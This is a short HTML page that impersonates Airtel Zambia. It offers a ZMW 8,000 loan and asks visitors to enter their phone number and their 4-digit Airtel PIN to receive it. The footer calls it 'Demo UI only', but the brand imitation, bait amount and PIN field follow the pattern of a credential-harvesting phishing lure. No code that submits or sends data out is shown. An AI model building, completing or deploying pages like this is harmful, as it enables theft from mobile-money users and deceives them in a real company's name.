<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airtel Zambia Loan</title>

    <!-- Link to external CSS -->
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="card">
        <h1>Airtel Zambia Loan Request</h1>

        <p class="subtitle">
            Welcome! Enter your phone number and Airtel PIN (4 digits) to receive your loan.
        </p>

        <div class="amount-box">
            <div class="amount-label">Eligible Loan Amount</div>
            <div class="amount">ZMW 8,000</div>
        </div>

        <input type="tel" placeholder="Phone Number (e.g. 097XXXXXXX)">
        <input type="password" placeholder="Airtel PIN (4 digits)">

        <button>Submit</button>

        <div class="footer">
            Entering your PIN confirms acceptance of the terms and conditions.
            <br><br>
            © Airtel Zambia – Demo UI only
        </div>
    </div>

</body>
</html>
